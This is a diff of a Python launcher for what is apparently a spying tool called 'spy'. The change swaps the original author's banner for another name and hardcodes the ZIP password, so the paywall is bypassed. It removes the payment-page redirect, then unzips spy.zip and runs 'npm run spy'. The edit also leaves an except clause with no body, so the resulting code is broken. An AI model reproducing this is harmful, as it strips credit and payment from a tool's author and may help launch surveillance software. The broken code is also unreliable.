@@ -37,9 +37,8 @@ y = r
 
 # ------------------banners
 logo = Panel("""
-[bold white]</> [italic green] STARK-404 [bold white]</>
-[bold white] </> [italic green] Github: STARK-404 [bold white]</>
-[bold white] </> [italic green] instagram la1uuuuu [bold white]</>
+[bold white]</> [italic green] Bhardi Yavov [bold white]</>
+[bold white] </> [italic green] instagram bhardiyavok [bold white]</>
 """)
 
 def banner():
@@ -63,44 +62,33 @@ def front_design():
 
 front_design()
 
-
 class Setup:
-    def __init__(self,user):
-        self.data = user
+    def __init__(self):
+        # Senha fixa para o ZIP
         self.fixed_password = "itsawaspybystark"
+    
     def mainFile(self):
-        self.save = self.data
         try:
             with pyzipper.AESZipFile('spy.zip', 'r', compression=pyzipper.ZIP_DEFLATED,
                                      encryption=pyzipper.WZ_AES) as extracted_zip:
-                  extracted_zip.extractall(pwd=str.encode(self.fixed_password))
+                # Usa a senha fixa
+                extracted_zip.extractall(pwd=str.encode(self.fixed_password))
                 
             designprint('Password automatically applied, file unzipped successfully!')
             sleep(2.3)
             front_design()
-            designprint('Successfully Decrypted and unzipped file with password..')
+            designprint('Successfully decrypted and unzipped file with password.')
             sleep(3.0)
             exixting_directory_file('spy.zip')
             os.system('mv main.ts Main/|npm run spy' if os.name=='nt' else 'mv main.ts Main/|npm run spy')
+        
         except Exception as samay:
-            designprint('Password Incorrect !')
-            print("[•]Contact Admin For Password!")
-            print('[bold green] Mail:- gamerunknown509@gmail.com')
-            print("[!] You Have Been Redirected To Payment Page!!")
-            os.system("xdg-open https://www.buymeacoffee.com/mrstarkin/e/174352")
-            os.system('python main.py' if os.name=='nt' else 'python3 main.py')
 
-
-try:
-    user_ezip_unzipping = getpass(r+"└─"+w+"\033[1;37mEnter the password of Zipfile : "+r).strip()
-except:
-    pass
 
 if __name__ == '__main__':
     exixting_directory_file('python index.py')
-    main_start = Setup(user_ezip_unzipping)
+    main_start = Setup()
     main_start.mainFile()
-
 
 
 
